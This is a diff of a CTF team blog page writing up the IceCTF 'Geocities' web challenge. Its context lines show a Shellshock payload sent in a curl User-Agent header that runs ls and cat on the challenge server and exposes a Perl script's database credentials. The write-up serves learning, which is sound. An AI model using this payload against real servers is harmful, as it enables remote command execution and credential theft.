@@ -18,18 +18,18 @@
   
   
   <title>IceCTF [web] - Geocities | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in yea">
+  <meta name="description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it&apos;s a miracle that it&apos;s still up! It must be running some ancient technology and probably hasn&apos;t been updated in yea">
 <meta name="keywords" content="web,shellshock,perl,sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="IceCTF [web] - Geocities">
 <meta property="og:url" content="https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in yea">
+<meta property="og:description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it&apos;s a miracle that it&apos;s still up! It must be running some ancient technology and probably hasn&apos;t been updated in yea">
 <meta property="og:locale" content="en">
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IceCTF [web] - Geocities">
-<meta name="twitter:description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in yea">
+<meta name="twitter:description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it&apos;s a miracle that it&apos;s still up! It must be running some ancient technology and probably hasn&apos;t been updated in yea">
   <!-- Canonical links -->
   <link rel="canonical" href="https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/index.html">
   
@@ -351,9 +351,8 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <blockquote>I recently stumbled onto this old geocities site (<a href="http://geocities.vuln.icec.tf/)" target="_blank" rel="noopener">http://geocities.vuln.icec.tf/)</a>, it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in years, it’s our lucky day boys!</blockquote>
-
-<p>After analyzing the website I didn’t found nothing until I started reading the messages where there was some hints, the blog posts were speaking about some websites made in perl and bash, and I started thinking there maybe were some CGI scripts on the website. I tryed to find any particular file in the cgi-bin folder but nothing. Until I did the most obvivious which was trying to access this “<a href="http://geocities.vuln.icec.tf/index.cgi&quot;" target="_blank" rel="noopener">http://geocities.vuln.icec.tf/index.cgi&quot;</a> and it existed! Now lets try some ShellShock with Curl:</p>
+        <blockquote>I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it's a miracle that it's still up! It must be running some ancient technology and probably hasn't been updated in years, it's our lucky day boys!</blockquote>
+<p>After analyzing the website I didn’t found nothing until I started reading the messages where there was some hints, the blog posts were speaking about some websites made in perl and bash, and I started thinking there maybe were some CGI scripts on the website. I tryed to find any particular file in the cgi-bin folder but nothing. Until I did the most obvivious which was trying to access this “<a href="http://geocities.vuln.icec.tf/index.cgi" target="_blank" rel="noopener">http://geocities.vuln.icec.tf/index.cgi</a>” and it existed! Now lets try some ShellShock with Curl:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/ls"</span> http://geocities.vuln.icec.tf/index.cgi</span><br><span class="line"></span><br><span class="line">blog.html</span><br><span class="line">get_posts.pl</span><br><span class="line">img</span><br><span class="line">index.cgi</span><br></pre></td></tr></table></figure>
 <p>And it worked! now lets start looking into those files:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/cat get_posts.pl"</span> http://geocities.vuln.icec.tf/index.cgi</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line">use strict;</span><br><span class="line">use DBI;</span><br><span class="line"></span><br><span class="line">my <span class="variable">$dbh</span> = DBI-&gt;connect(</span><br><span class="line">    <span class="string">"dbi:mysql:dbname=geocities;host=icectf_mariadb"</span>,</span><br><span class="line">    <span class="string">"geocities"</span>,</span><br><span class="line">    <span class="string">"geocities"</span>,</span><br><span class="line">    &#123; RaiseError =&gt; 1 &#125;,</span><br><span class="line">) or die <span class="variable">$DBI</span>::errstr;</span><br><span class="line"></span><br><span class="line">my <span class="variable">$sth</span> = <span class="variable">$dbh</span>-&gt;prepare(<span class="string">"SELECT * from Posts ORDER BY post_date DESC"</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">my <span class="variable">$row</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$sth</span>-&gt;fetchrow_arrayref()) &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"@<span class="variable">$row</span>[1];@<span class="variable">$row</span>[2];@<span class="variable">$row</span>[3]\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sth</span>-&gt;finish();</span><br><span class="line"><span class="variable">$dbh</span>-&gt;disconnect();</span><br></pre></td></tr></table></figure>
@@ -462,7 +461,7 @@
 
     <div class="copyright">
     	
-        &copy; 2022 TEAMROCKETIST
+        &copy; 2023 TEAMROCKETIST
         
         
     </div>
@@ -552,15 +551,14 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-    <script defer type="text/javascript">
-(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-9Y11W83X49"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-ga('create', 'UA-104385070-1', 'auto');
-ga('send', 'pageview');
-
+  gtag('config', 'G-9Y11W83X49');
 </script>
 
 
